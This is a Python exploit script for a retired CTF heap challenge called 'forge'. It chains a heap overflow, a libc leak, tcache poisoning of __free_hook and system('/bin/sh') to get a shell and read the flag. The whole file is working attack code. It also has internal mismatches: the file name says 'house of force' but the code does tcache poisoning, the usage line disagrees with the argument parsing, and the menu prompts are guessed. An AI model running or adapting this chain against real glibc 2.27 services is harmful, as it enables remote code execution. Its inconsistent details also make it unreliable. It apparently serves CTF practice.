#!/usr/bin/env python3
"""forge - Pwn (Medium): heap note app on glibc 2.27; temper() reads notes[i].size
bytes after strlen(p), giving a linear heap overflow. Used to un-NUL a size field,
leak main_arena from an unsorted-bin fd, poison a tcache fd to __free_hook and run
system("/bin/sh").

Usage: python3 forge_house_of_force.py <host> <port>   (remote)
       python3 forge_house_of_force.py local [./forge] (local binary)

The CSCTF 2026 instance is retired; this PoC documents the exploit path.

Note: the writeup does not reproduce the menu prompt strings; forge/temper/
inspect/melt below assume a simple numeric menu. Adjust the recvuntil patterns
to the binary's actual output if running it.
"""
import sys
from pwn import *

# libc offsets (Ubuntu GLIBC 2.27-3ubuntu1.6)
MAIN_ARENA = 0x3ebc40
UNSORTED_FD = MAIN_ARENA + 0x60   # 0x3ebca0
FREE_HOOK = 0x3ed8e8
SYSTEM = 0x4f420


def forge(p, size, content=None):
    p.sendlineafter(b"> ", b"forge")   # TODO: adjust menu prompts to the binary
    p.sendlineafter(b"size: ", str(size).encode())
    if content is not None:
        p.sendafter(b"content: ", content)


def temper(p, idx, data):
    p.sendlineafter(b"> ", b"temper")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendafter(b"data: ", data)


def inspect(p, idx):
    p.sendlineafter(b"> ", b"inspect")
    p.sendlineafter(b"index: ", str(idx).encode())
    return p.recvuntil(b"\n")


def melt(p, idx):
    p.sendlineafter(b"> ", b"melt")
    p.sendlineafter(b"index: ", str(idx).encode())


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        binary = sys.argv[2] if len(sys.argv) > 2 else "./forge"
        p = process(binary)
    elif len(sys.argv) >= 2:
        host, _, port = sys.argv[1].partition(":")
        p = remote(host, int(port))
    else:
        raise SystemExit(__doc__)

    # Allocate every chunk up front: any malloc falling through to the corrupted
    # unsorted chunk would abort.
    a = 0   # A'  (0x18)
    c = 1   # C   (0x500) -> unsorted bin on free
    d = 2   # D   (0x18)  guard, holds "/bin/sh\0"
    e = 3   # E   (0x28)  overflow source for tcache poison
    f = 4   # F   (0x28)  tcache victim
    g = 5   # G   (0x28)
    forge(p, 0x18, b"A" * 0x18)           # A' fully filled: no NUL inside
    forge(p, 0x500, b"C" * 0x500)         # C
    forge(p, 0x18, b"/bin/sh\x00")        # D
    forge(p, 0x28, b"E" * 0x28)           # E fully filled
    forge(p, 0x28)                        # F
    forge(p, 0x28)                        # G

    # --- Step 1: libc leak via unsorted-bin fd, un-NUL'd by the temper() overflow.
    melt(p, c)                            # free(C) -> unsorted bin, C.fd = main_arena+0x60
    # After free(C), strlen(A') = 0x18 + 2 (bytes 11 05, then NUL); the write lands
    # at C.size+2 and rewrites the size field to 0xffffffffffff0511.
    temper(p, a, b"\xff" * 6)
    out = inspect(p, a)                   # puts over-read reaches C.fd
    # line = A*0x18 + 11 05 ff*6 + 6 bytes of fd (main_arena+0x60)
    leak = u64(out[0x20:0x26].ljust(8, b"\x00"))
    libc_base = leak - UNSORTED_FD
    free_hook = libc_base + FREE_HOOK
    system = libc_base + SYSTEM
    log.info("libc base  = %s", hex(libc_base))

    # --- Step 2: tcache poison. free(G), free(F) -> tcache[0x30] head = F.
    melt(p, g)
    melt(p, f)
    # strlen(E) = 0x28 + 1 (next chunk size 0x31 is nonzero); write lands at F.size+1.
    temper(p, e, b"A" * 7 + p64(free_hook))

    # --- Step 3: two forge(0x28) calls: pop F, then land on __free_hook.
    forge(p, 0x28)
    forge(p, 0x28, p64(system))           # glibc 2.27 tcache: no alignment/size checks

    # --- Step 4: melt(D) -> free("/bin/sh") -> __free_hook -> system("/bin/sh")
    melt(p, d)

    p.sendline(b"cat /flag*")
    p.interactive()


if __name__ == "__main__":
    main()
